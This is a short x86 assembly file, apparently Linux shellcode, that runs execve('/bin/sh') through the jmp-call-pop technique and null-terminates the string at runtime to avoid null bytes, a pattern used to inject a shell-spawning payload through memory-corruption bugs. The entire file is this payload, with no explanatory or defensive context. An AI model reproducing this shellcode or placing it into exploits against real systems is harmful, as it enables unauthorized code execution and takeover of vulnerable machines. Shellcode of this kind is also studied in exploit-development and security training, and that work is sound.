.text
.globl _start
_start:
	xorl %eax, %eax
	movb $11, %al
	jmp binsh
	back:
	movl (%esp), %ebx
	cdq
	movl %edx, %ecx
	movb %dl, 0x7(%ebx)
	int $0x80
binsh:
	call back
	.ascii "/bin/sh"


